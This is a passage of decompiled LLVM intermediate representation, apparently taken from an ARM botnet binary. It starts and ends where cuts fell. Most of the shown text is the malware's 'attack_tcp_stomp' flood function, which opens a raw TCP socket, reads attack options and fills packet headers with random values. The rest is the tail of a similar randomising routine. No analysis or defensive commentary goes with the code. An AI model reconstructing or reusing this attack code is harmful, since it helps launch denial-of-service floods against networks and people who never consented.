  %v9_94ec = icmp eq i32 %v0_94ec, 65535
  store i1 %v9_94ec, i1* %cpsr_z.global-to-local, align 1
  %v1_94f0 = load i32, i32* @r5, align 4
  %v2_94f0 = add i32 %v1_94f0, 12
  %v3_94f0 = inttoptr i32 %v2_94f0 to i32*
  store i32 %v0_94e0, i32* %v3_94f0, align 4
  br i1 %v9_94ec, label %dec_label_pc_94f8, label %dec_label_pc_94e0.dec_label_pc_9370_crit_edge

dec_label_pc_94e0.dec_label_pc_9370_crit_edge:    ; preds = %dec_label_pc_94e0
  %v1_9374.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_9370

dec_label_pc_94f8:                                ; preds = %dec_label_pc_94e0, %dec_label_pc_9360
  %v0_94f8 = call i32 @rand_next()
  %v3_9500 = urem i32 %v0_94f8, 65536
  %v1_9508 = sub nsw i32 999, %v3_9500
  store i32 %v1_9508, i32* %r3.global-to-local, align 4
  %v1_950c = trunc i32 %v0_94f8 to i16
  %v2_950c = load i32, i32* @r5, align 4
  %v3_950c = add i32 %v2_950c, 4
  %v4_950c = inttoptr i32 %v3_950c to i16*
  store i16 %v1_950c, i16* %v4_950c, align 2
  %v0_9510 = load i32, i32* %r3.global-to-local, align 4
  %v1_9510 = trunc i32 %v0_9510 to i16
  %v2_9510 = load i32, i32* @r6, align 4
  %v3_9510 = add i32 %v2_9510, 4
  %v4_9510 = inttoptr i32 %v3_9510 to i16*
  store i16 %v1_9510, i16* %v4_9510, align 2
  store i32 %v3_911c, i32* %r3.global-to-local, align 4
  %v1_9518 = load i32, i32* @r4, align 4
  %v9_9518 = icmp eq i32 %v3_911c, %v1_9518
  store i1 %v9_9518, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9518, label %dec_label_pc_9520, label %dec_label_pc_937c

dec_label_pc_9520:                                ; preds = %dec_label_pc_94f8, %dec_label_pc_9370
  %v0_9520 = call i32 @rand_next()
  %v1_9520 = trunc i32 %v0_9520 to i16
  store i32 %v3_9120, i32* %ip.global-to-local, align 4
  %v1_9528 = load i32, i32* @r4, align 4
  %v9_9528 = icmp eq i32 %v3_9120, %v1_9528
  store i1 %v9_9528, i1* %cpsr_z.global-to-local, align 1
  %v3_952c = load i32, i32* @r5, align 4
  %v4_952c = add i32 %v3_952c, 44
  %v5_952c = inttoptr i32 %v4_952c to i16*
  store i16 %v1_9520, i16* %v5_952c, align 2
  br i1 %v9_9528, label %dec_label_pc_9534, label %dec_label_pc_9388

dec_label_pc_9534:                                ; preds = %dec_label_pc_9520, %dec_label_pc_937c
  %v0_9534 = call i32 @rand_next()
  %v1_9534 = trunc i32 %v0_9534 to i16
  store i32 %v1_9118, i32* @lr, align 4
  store i1 %v2_953c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_953c, label %.thread29, label %bb85

.thread29:                                        ; preds = %dec_label_pc_9534
  %v3_954430 = load i32, i32* @r7, align 4
  %v4_954431 = add i32 %v3_954430, 2
  %v5_954432 = inttoptr i32 %v4_954431 to i16*
  store i16 %v1_9534, i16* %v5_954432, align 2
  br label %dec_label_pc_9550

bb85:                                             ; preds = %dec_label_pc_9534
  %v1_9540 = load i32, i32* @r5, align 4
  %v2_9540 = add i32 %v1_9540, 16
  %v3_9540 = inttoptr i32 %v2_9540 to i32*
  %v4_9540 = load i32, i32* %v3_9540, align 4
  store i32 %v4_9540, i32* %r3.global-to-local, align 4
  %v3_9544 = load i32, i32* @r7, align 4
  %v4_9544 = add i32 %v3_9544, 2
  %v5_9544 = inttoptr i32 %v4_9544 to i16*
  store i16 %v1_9534, i16* %v5_9544, align 2
  %v1_9548 = load i32, i32* %r3.global-to-local, align 4
  %v2_9548 = load i32, i32* @r6, align 4
  %v3_9548 = add i32 %v2_9548, 16
  %v4_9548 = inttoptr i32 %v3_9548 to i32*
  store i32 %v1_9548, i32* %v4_9548, align 4
  br label %dec_label_pc_939c

dec_label_pc_9550:                                ; preds = %.thread29, %dec_label_pc_9388
  %v0_9550 = call i32 @rand_next()
  store i32 %v1_906c, i32* %r1.global-to-local, align 4
  store i1 %v2_9558, i1* %cpsr_z.global-to-local, align 1
  %v1_955c = load i32, i32* @r6, align 4
  %v2_955c = add i32 %v1_955c, 16
  %v3_955c = inttoptr i32 %v2_955c to i32*
  store i32 %v0_9550, i32* %v3_955c, align 4
  br i1 %v2_9558, label %dec_label_pc_93a8, label %dec_label_pc_9564

dec_label_pc_9564:                                ; preds = %dec_label_pc_939c, %dec_label_pc_9550
  %v0_9564 = load i32, i32* @r7, align 4
  %v1_9564 = add i32 %v0_9564, 8
  store i32 %v1_9564, i32* @r4, align 4
  store i32 %v6_904c, i32* %r1.global-to-local, align 4
  %v2_9570 = call i32 @rand_alphastr(i32 %v1_9564, i32 %v6_904c)
  store i32 %v6_904c, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_957c = load i32, i32* @r4, align 4
  %v4_957c = add i32 %v2_957c, %v6_904c
  %v5_957c = inttoptr i32 %v4_957c to i8*
  store i8 0, i8* %v5_957c, align 1
  br label %dec_label_pc_93a8

dec_label_pc_9584:                                ; preds = %dec_label_pc_93a8, %dec_label_pc_932c
  %v2_9588 = call i32 @__GI_time(i32* null)
  store i32 %v2_90b0, i32* %ip.global-to-local, align 4
  %v9_9590 = icmp eq i32 %v2_90b0, %v2_9588
  store i1 %v9_9590, i1* %cpsr_z.global-to-local, align 1
  %v6_9594 = icmp slt i32 %v2_90b0, %v2_9588
  br i1 %v6_9594, label %dec_label_pc_9598, label %dec_label_pc_932c

dec_label_pc_9598:                                ; preds = %dec_label_pc_9584, %entry, %dec_label_pc_95a4
  %v1_95a0 = phi i32 [ %v3_90c4, %entry ], [ %v1_95a8, %dec_label_pc_95a4 ], [ %v2_9588, %dec_label_pc_9584 ]
  store i32 %v3_8f54, i32* %r4.global-to-local, align 4
  store i32 %v24_8f54, i32* %fp.global-to-local, align 4
  store i32 %v27_8f54, i32* %lr.global-to-local, align 4
  ret i32 %v1_95a0

dec_label_pc_95a4:                                ; preds = %dec_label_pc_90d4
  %v1_95a8 = call i32 @__GI___libc_close(i32 %v3_90c4)
  br label %dec_label_pc_9598

; uselistorder directives
  uselistorder i16 %v1_9534, { 1, 0 }
  uselistorder i32 %v1_9518, { 1, 0 }
  uselistorder i32 %v0_94f8, { 1, 0 }
  uselistorder i32 %v5_94cc, { 1, 0 }
  uselistorder i32 %v3_9480, { 3, 1, 2, 0, 4 }
  uselistorder i32 %v7_946c, { 1, 0, 2 }
  uselistorder i32 %v1_9444, { 1, 2, 0, 3 }
  uselistorder i32 %v3_93f4, { 1, 0, 2 }
  uselistorder i1 %v2_9558, { 2, 3, 1, 0 }
  uselistorder i1 %v2_953c, { 2, 3, 1, 0 }
  uselistorder i1 %v7_9358, { 2, 1, 0 }
  uselistorder i32 %v0_92d8, { 1, 0 }
  uselistorder i32 %v1_9160, { 1, 0 }
  uselistorder i32 %v3_914c, { 2, 1, 0 }
  uselistorder i1 %v2_9124, { 1, 0, 2, 3 }
  uselistorder i32 %v1_9118, { 4, 3, 5, 1, 2, 0 }
  uselistorder i32 %v3_9114, { 1, 0 }
  uselistorder i32 %v0_9110, { 1, 0, 2, 3 }
  uselistorder i32 %v0_90fc, { 2, 0, 1, 3 }
  uselistorder i1 %v7_90f4, { 1, 0 }
  uselistorder i1 %v7_90c8, { 1, 0 }
  uselistorder i32 %v3_90c4, { 3, 1, 4, 2, 0 }
  uselistorder i32 %v2_90b0, { 2, 1, 0 }
  uselistorder i32 %v6_90a0, { 3, 4, 0, 5, 1, 2 }
  uselistorder i32 %v1_906c, { 2, 1, 3, 4, 0 }
  uselistorder i32 %v6_904c, { 1, 4, 3, 2, 5, 7, 6, 0 }
  uselistorder i32 %v1_9000, { 1, 2, 0 }
  uselistorder i32 %v1_8fdc, { 3, 2, 1, 0 }
  uselistorder i32 %v6_8fd4, { 1, 0 }
  uselistorder i32 %v7_8fbc, { 1, 0, 4, 3, 2, 5 }
  uselistorder i32 %v6_8f98, { 3, 2, 1, 4, 0 }
  uselistorder i32 %v2_8f80, { 0, 3, 1, 2, 4 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 10 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 5, 15, 6, 7, 8, 9, 10, 11, 12, 13, 14, 16 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 18, 9, 10, 11, 12, 13, 14, 15, 16, 17, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 10, 4, 5, 6, 7, 8, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 29, 28, 30, 31, 32, 33, 34, 35, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 11, 5, 6, 7, 8, 9, 10, 12, 13, 14, 15, 16, 17, 18, 20, 19, 21, 22, 23, 24, 25, 27, 26, 28, 29, 31, 30, 33, 32, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 14, 7, 8, 9, 10, 11, 12, 13, 15, 16, 17, 18, 19, 20, 21, 22, 23 }
  uselistorder i32 %arg2, { 6, 5, 4, 7, 1, 0, 3, 2, 8, 9, 10 }
  uselistorder label %dec_label_pc_9598, { 2, 0, 1 }
  uselistorder label %dec_label_pc_9564, { 1, 0 }
  uselistorder label %dec_label_pc_93a8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_932c, { 1, 0 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @attack_tcp_stomp(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp32 = call i8 @__decompiler_undefined_function_3()
  %tmp33 = call i16 @__decompiler_undefined_function_2()
  %tmp34 = call i32 @__decompiler_undefined_function_0()
  %tmp36 = call i32 @__decompiler_undefined_function_0()
  %tmp62 = call i16 @__decompiler_undefined_function_2()
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_95b4 = load i32, i32* @r4, align 4
  %v27_95b4 = load i32, i32* @lr, align 4
  store i32 0, i32* @r7, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 16, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg5, i32* @r4, align 4
  store i32 %arg3, i32* @fp, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v2_95e0 = call i32 @calloc(i32 %arg2, i32 16)
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  %v2_95f0 = call i32 @calloc(i32 %arg2, i32 4)
  %v0_95f4 = load i32, i32* @r4, align 4
  store i32 %v0_95f4, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_9600 = load i32, i32* @r7, align 4
  store i32 %v0_9600, i32* %r3.global-to-local, align 4
  %v0_9604 = load i32, i32* @r5, align 4
  store i32 %v0_9604, i32* %r0.global-to-local, align 4
  %v5_9608 = inttoptr i32 %v0_95f4 to i32*
  %v6_9608 = call i32 @attack_get_opt_int(i32 %v0_9604, i32* %v5_9608, i32 2, i32 %v0_9600, i32 %v2_95f0)
  %v1_9614 = urem i32 %v6_9608, 256
  store i32 %v1_9614, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_9620 = load i32, i32* @r4, align 4
  store i32 %v0_9620, i32* %r1.global-to-local, align 4
  %v0_9624 = load i32, i32* @r5, align 4
  store i32 %v0_9624, i32* %r0.global-to-local, align 4
  %v5_9628 = trunc i32 %v6_9608 to i8
  %v6_962c = inttoptr i32 %v0_9620 to i32*
  %v7_962c = call i32 @attack_get_opt_int(i32 %v0_9624, i32* %v6_962c, i32 3, i32 65535, i32 %v6_9608)
  %v0_9630 = load i32, i32* @r4, align 4
  store i32 %v0_9630, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_962c, i32* @r8, align 4
  %v0_9640 = load i32, i32* @r5, align 4
  store i32 %v0_9640, i32* %r0.global-to-local, align 4
  %v5_9644 = inttoptr i32 %v0_9630 to i32*
  %v6_9644 = call i32 @attack_get_opt_int(i32 %v0_9640, i32* %v5_9644, i32 4, i32 64, i32 ptrtoint (i32* @0 to i32))
  %v1_964c = urem i32 %v6_9644, 256
  store i32 %v1_964c, i32* %ip.global-to-local, align 4
  %v0_9650 = load i32, i32* @r4, align 4
  store i32 %v0_9650, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_965c = load i32, i32* @r5, align 4
  store i32 %v0_965c, i32* %r0.global-to-local, align 4
  %v5_9660 = trunc i32 %v6_9644 to i8
  %v6_9664 = inttoptr i32 %v0_9650 to i32*
  %v7_9664 = call i32 @attack_get_opt_int(i32 %v0_965c, i32* %v6_9664, i32 5, i32 1, i32 %v6_9644)
  %v1_9670 = urem i32 %v7_9664, 256
  store i32 %v1_9670, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_9678 = load i32, i32* @r4, align 4
  store i32 %v0_9678, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_9680 = load i32, i32* @r5, align 4
  store i32 %v0_9680, i32* %r0.global-to-local, align 4
  %v5_9688 = inttoptr i32 %v0_9678 to i32*
  %v6_9688 = call i32 @attack_get_opt_int(i32 %v0_9680, i32* %v5_9688, i32 7, i32 65535, i32 %v1_9670)
  %v0_968c = load i32, i32* @r4, align 4
  store i32 %v0_968c, i32* %r1.global-to-local, align 4
  %v3_9690 = mul i32 %v6_9688, 65536
  store i32 %v3_9690, i32* %ip.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v0_9698 = load i32, i32* @r7, align 4
  store i32 %v0_9698, i32* %r3.global-to-local, align 4
  %v0_969c = load i32, i32* @r5, align 4
  store i32 %v0_969c, i32* %r0.global-to-local, align 4
  %v3_96a0 = urem i32 %v6_9688, 65536
  store i32 %v3_96a0, i32* @sb, align 4
  %v5_96a4 = inttoptr i32 %v0_968c to i32*
  %v6_96a4 = call i32 @attack_get_opt_int(i32 %v0_969c, i32* %v5_96a4, i32 10, i32 %v0_9698, i32 ptrtoint (i32* @0 to i32))
  %v1_96ac = urem i32 %v6_96a4, 256
  store i32 %v1_96ac, i32* %ip.global-to-local, align 4
  %v0_96b0 = load i32, i32* @r4, align 4
  store i32 %v0_96b0, i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_96bc = load i32, i32* @r5, align 4
  store i32 %v0_96bc, i32* %r0.global-to-local, align 4
  %v5_96c4 = inttoptr i32 %v0_96b0 to i32*
  %v6_96c4 = call i32 @attack_get_opt_int(i32 %v0_96bc, i32* %v5_96c4, i32 11, i32 1, i32 %v1_96ac)
  %v1_96cc = urem i32 %v6_96c4, 256
  store i32 %v1_96cc, i32* %ip.global-to-local, align 4
  %v0_96d0 = load i32, i32* @r4, align 4
  store i32 %v0_96d0, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_96dc = load i32, i32* @r5, align 4
  store i32 %v0_96dc, i32* %r0.global-to-local, align 4
  %v5_96e4 = inttoptr i32 %v0_96d0 to i32*
  %v6_96e4 = call i32 @attack_get_opt_int(i32 %v0_96dc, i32* %v5_96e4, i32 12, i32 1, i32 %v1_96cc)
  %v1_96ec = urem i32 %v6_96e4, 256
  store i32 %v1_96ec, i32* %ip.global-to-local, align 4
  %v0_96f0 = load i32, i32* @r4, align 4
  store i32 %v0_96f0, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_96f8 = load i32, i32* @r7, align 4
  store i32 %v0_96f8, i32* %r3.global-to-local, align 4
  %v0_96fc = load i32, i32* @r5, align 4
  store i32 %v0_96fc, i32* %r0.global-to-local, align 4
  %v5_9704 = inttoptr i32 %v0_96f0 to i32*
  %v6_9704 = call i32 @attack_get_opt_int(i32 %v0_96fc, i32* %v5_9704, i32 13, i32 %v0_96f8, i32 %v1_96ec)
  %v1_970c = urem i32 %v6_9704, 256
  store i32 %v1_970c, i32* %ip.global-to-local, align 4
  %v0_9710 = load i32, i32* @r4, align 4
  store i32 %v0_9710, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  %v0_9718 = load i32, i32* @r7, align 4
  store i32 %v0_9718, i32* %r3.global-to-local, align 4
  %v0_971c = load i32, i32* @r5, align 4
  store i32 %v0_971c, i32* %r0.global-to-local, align 4
  %v5_9724 = inttoptr i32 %v0_9710 to i32*
  %v6_9724 = call i32 @attack_get_opt_int(i32 %v0_971c, i32* %v5_9724, i32 14, i32 %v0_9718, i32 %v1_970c)
  %v1_972c = urem i32 %v6_9724, 256
  store i32 %v1_972c, i32* %ip.global-to-local, align 4
  %v0_9730 = load i32, i32* @r4, align 4
  store i32 %v0_9730, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_9738 = load i32, i32* @r7, align 4
  store i32 %v0_9738, i32* %r3.global-to-local, align 4
  %v0_973c = load i32, i32* @r5, align 4
  store i32 %v0_973c, i32* %r0.global-to-local, align 4
  %v5_9744 = inttoptr i32 %v0_9730 to i32*
  %v6_9744 = call i32 @attack_get_opt_int(i32 %v0_973c, i32* %v5_9744, i32 15, i32 %v0_9738, i32 %v1_972c)
  %v1_974c = urem i32 %v6_9744, 256
  store i32 %v1_974c, i32* %ip.global-to-local, align 4
  %v0_9750 = load i32, i32* @r7, align 4
  store i32 %v0_9750, i32* %r2.global-to-local, align 4
  store i32 768, i32* %r3.global-to-local, align 4
  %v0_9758 = load i32, i32* @r4, align 4
  store i32 %v0_9758, i32* %r1.global-to-local, align 4
  %v0_975c = load i32, i32* @r5, align 4
  store i32 %v0_975c, i32* %r0.global-to-local, align 4
  %v5_9764 = inttoptr i32 %v0_9758 to i32*
  %v6_9764 = call i32 @attack_get_opt_int(i32 %v0_975c, i32* %v5_9764, i32 %v0_9750, i32 768, i32 %v1_974c)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_9770 = load i32, i32* @r4, align 4
  store i32 %v0_9770, i32* %r1.global-to-local, align 4
  %v0_9778 = load i32, i32* @r5, align 4
  store i32 %v0_9778, i32* %r0.global-to-local, align 4
  %v5_977c = inttoptr i32 %v0_9770 to i32*
  %v6_977c = call i32 @attack_get_opt_int(i32 %v0_9778, i32* %v5_977c, i32 1, i32 1, i32 ptrtoint (i32* @0 to i32))
  %v1_9784 = urem i32 %v6_977c, 256
  store i32 %v1_9784, i32* %r3.global-to-local, align 4
  %v0_9788 = load i32, i32* @r7, align 4
  store i32 %v0_9788, i32* %r0.global-to-local, align 4
  %v1_9790 = inttoptr i32 %v0_9788 to i32*
  %v2_9790 = call i32 @__GI_time(i32* %v1_9790)
  %v1_9794 = load i32, i32* @r6, align 4
  %v2_9794 = add i32 %v1_9794, %v2_9790
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_97a8 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_97a8, i32* %r0.global-to-local, align 4
  %v7_97ac = icmp eq i32 %v3_97a8, -1
  store i32 %v3_97a8, i32* @sl, align 4
  br i1 %v7_97ac, label %dec_label_pc_9aec, label %dec_label_pc_97b8

dec_label_pc_97b8:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_97c0 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_97c0, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  %v0_97c8 = load i32, i32* @r7, align 4
  store i32 %v0_97c8, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_97d4 = call i32 @__GI_setsockopt(i32 %v3_97a8, i32 %v0_97c8, i32 3, i32 %v6_97c0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_97d4, i32* %r0.global-to-local, align 4
  %v7_97d8 = icmp eq i32 %v5_97d4, -1
  br i1 %v7_97d8, label %dec_label_pc_9ae4, label %dec_label_pc_97e0

dec_label_pc_97e0:                                ; preds = %dec_label_pc_97b8
  store i32 %arg2, i32* %r0.global-to-local, align 4
  %v0_97e4 = load i32, i32* @r8, align 4
  %v3_97e8 = urem i32 %v0_97e4, 65536
  store i32 %v3_97e8, i32* @r3, align 4
  %v2_97ec = icmp eq i32 %arg2, 0
  %v0_97f0 = load i32, i32* @r7, align 4
  store i32 %v0_97f0, i32* %stack_var_-44, align 4
  %v5_97f4 = trunc i32 %v0_97e4 to i16
  br i1 %v2_97ec, label %dec_label_pc_97e0.dec_label_pc_9988.preheader_crit_edge, label %dec_label_pc_97fc.preheader

dec_label_pc_97e0.dec_label_pc_9988.preheader_crit_edge: ; preds = %dec_label_pc_97e0
  %.pre = sext i16 %v5_97f4 to i32
  %.pre94 = add i32 %v6_9764, 40
  br label %dec_label_pc_9988.preheader

dec_label_pc_97fc.preheader:                      ; preds = %dec_label_pc_97e0
  %v2_9840 = ptrtoint i32* %stack_var_-160 to i32
  %v2_9888 = ptrtoint i32* %stack_var_-64 to i32
  %v2_98a0 = ptrtoint i32* %stack_var_-80 to i32
  %v2_98a8 = ptrtoint i32* %stack_var_-336 to i32
  %v2_98ac = ptrtoint i32* %stack_var_-48 to i32
  %v4_9934 = zext i8 %tmp32 to i32
  %v1_9938 = and i32 %v4_9934, 18
  %v2_993c = icmp eq i32 %v1_9938, 18
  %v1_9bec = add i32 %v6_9764, 40
  %v4_9c2c = sext i16 %v5_97f4 to i32
  %v3_9c38 = udiv i32 %v4_9c2c, 256
  %v1_9d14 = urem i32 %v6_96a4, 2
  %tmp95 = sub nsw i32 0, %v1_9d14
  %v4_9d1c = and i32 %tmp95, 32
  %v1_9d48 = urem i32 %v6_96e4, 2
  %tmp96 = sub nsw i32 0, %v1_9d48
  %v4_9d50 = and i32 %tmp96, 8
  %v1_9d94 = urem i32 %v6_9744, 2
  %v3_9920 = sext i16 %tmp62 to i32
  %v1_9944 = and i32 %v4_9934, 5
  %v2_9944 = icmp eq i32 %v1_9944, 0
  %v4_9880 = add i32 %v2_9840, 98
  %v5_9880 = inttoptr i32 %v4_9880 to i16*
  %v1_9c34 = mul nsw i32 %v4_9c2c, 256
  %v4_9c44 = and i32 %v1_9c34, 65280
  %v5_9c44 = or i32 %v4_9c44, %v3_9c38
  %v1_9d2c = urem i32 %v6_96c4, 2
  %tmp97 = sub nsw i32 0, %v1_9d2c
  %v4_9d34 = and i32 %tmp97, 16
  %v1_9d60 = urem i32 %v6_9704, 2
  %tmp98 = sub nsw i32 0, %v1_9d60
  %v4_9d68 = and i32 %tmp98, 4
  %v1_9d78 = urem i32 %v6_9724, 2
  %tmp99 = sub nsw i32 0, %v1_9d78
  %v3_9d80 = and i32 %tmp99, 2
  br label %dec_label_pc_97fc.outer

dec_label_pc_97fc.outer:                          ; preds = %dec_label_pc_97fc.preheader, %.thread10
  %stack_var_-340.0.ph = phi i32 [ %tmp, %dec_label_pc_97fc.preheader ], [ %v0_9c78, %.thread10 ]
  %stack_var_-62.0.ph = phi i16 [ %tmp33, %dec_label_pc_97fc.preheader ], [ %stack_var_-62.2, %.thread10 ]
  %stack_var_-60.0.ph = phi i32 [ %tmp36, %dec_label_pc_97fc.preheader ], [ %v0_9b90, %.thread10 ]
  br label %dec_label_pc_97fc

dec_label_pc_97fc:                                ; preds = %dec_label_pc_97fc.outer, %dec_label_pc_9970
  %stack_var_-62.0 = phi i16 [ %stack_var_-62.3, %dec_label_pc_9970 ], [ %stack_var_-62.0.ph, %dec_label_pc_97fc.outer ]
  %stack_var_-60.0 = phi i32 [ %stack_var_-60.4, %dec_label_pc_9970 ], [ %stack_var_-60.0.ph, %dec_label_pc_97fc.outer ]
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_9808 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_9808, i32* %r0.global-to-local, align 4
  %v7_980c = icmp eq i32 %v3_9808, -1
  store i32 %v3_9808, i32* @r8, align 4
  br i1 %v7_980c, label %dec_label_pc_9970, label %dec_label_pc_9818

dec_label_pc_9818:                                ; preds = %dec_label_pc_97fc, %dec_label_pc_994c
  %v0_9820 = phi i32 [ %v3_9960, %dec_label_pc_994c ], [ %v3_9808, %dec_label_pc_97fc ]
  %stack_var_-62.1 = phi i16 [ %stack_var_-62.2, %dec_label_pc_994c ], [ %stack_var_-62.0, %dec_label_pc_97fc ]
  %stack_var_-60.1 = phi i32 [ %v0_9b90, %dec_label_pc_994c ], [ %stack_var_-60.0, %dec_label_pc_97fc ]
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  %v2_9820 = call i32 @__libc_fcntl(i32 %v0_9820, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_9828 = or i32 %v2_9820, 2048
  store i32 %v1_9828, i32* @r2, align 4
  %v0_982c = load i32, i32* @r8, align 4
  store i32 %v0_982c, i32* %r0.global-to-local, align 4
  %v2_9830 = call i32 @__libc_fcntl(i32 %v0_982c, i32 4)
  store i32 %v2_9830, i32* %r0.global-to-local, align 4
  %v3_9834 = load i32, i32* %stack_var_-44, align 4
  %v5_983c = mul i32 %v3_9834, 24
  store i32 %v2_9840, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-64, align 4
  %v1_984c = load i32, i32* @fp, align 4
  %v2_984c = add i32 %v1_984c, %v5_983c
  store i32 %v2_984c, i32* %r3.global-to-local, align 4
  %v1_9850 = add i32 %v2_984c, 20
  %v2_9850 = inttoptr i32 %v1_9850 to i8*
  %v3_9850 = load i8, i8* %v2_9850, align 1
  %v4_9850 = zext i8 %v3_9850 to i32
  store i32 %v4_9850, i32* %r2.global-to-local, align 4
  %v2_9854 = icmp ugt i8 %v3_9850, 30
  %v7_9854 = icmp eq i8 %v3_9850, 31
  %v2_9858 = xor i1 %v7_9854, true
  %v3_9858 = and i1 %v2_9854, %v2_9858
  br i1 %v3_9858, label %bb, label %bb72

bb:                                               ; preds = %dec_label_pc_9818
  %v5_9858 = add i32 %v2_984c, 16
  %v6_9858 = inttoptr i32 %v5_9858 to i32*
  %v7_9858 = load i32, i32* %v6_9858, align 4
  store i32 %v7_9858, i32* %r3.global-to-local, align 4
  br label %bb72

bb72:                                             ; preds = %dec_label_pc_9818, %bb
  %v4_985c = phi i32 [ %v2_984c, %dec_label_pc_9818 ], [ %v7_9858, %bb ]
  %v4_985c.stack_var_-60.1 = select i1 %v3_9858, i32 %v4_985c, i32 %stack_var_-60.1
  %v2_9860 = xor i1 %v2_9854, true
  %v3_9860 = or i1 %v7_9854, %v2_9860
  br i1 %v3_9860, label %dec_label_pc_9af8, label %dec_label_pc_9864

dec_label_pc_9864:                                ; preds = %bb72, %dec_label_pc_9af8
  %v0_9b90 = phi i32 [ %v5_9b44, %dec_label_pc_9af8 ], [ %v4_985c.stack_var_-60.1, %bb72 ]
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_986c = load i32, i32* @sb, align 4
  %v9_986c = icmp eq i32 %v0_986c, 65535
  br i1 %v9_986c, label %dec_label_pc_9b50, label %.thread7

.thread7:                                         ; preds = %dec_label_pc_9864
  %v4_9870 = udiv i32 %v0_986c, 256
  %v2_9874 = urem i32 %v0_986c, 256
  store i32 %v2_9874, i32* %r2.global-to-local, align 4
  %v5_9878 = mul nuw nsw i32 %v2_9874, 256
  %v6_9878 = or i32 %v5_9878, %v4_9870
  store i32 %v6_9878, i32* %r3.global-to-local, align 4
  store i32 %v2_9840, i32* %ip.global-to-local, align 4
  %v2_9880 = trunc i32 %v6_9878 to i16
  store i16 %v2_9880, i16* %v5_9880, align 2
  br label %dec_label_pc_9888

dec_label_pc_9888:                                ; preds = %.thread7, %dec_label_pc_9b50
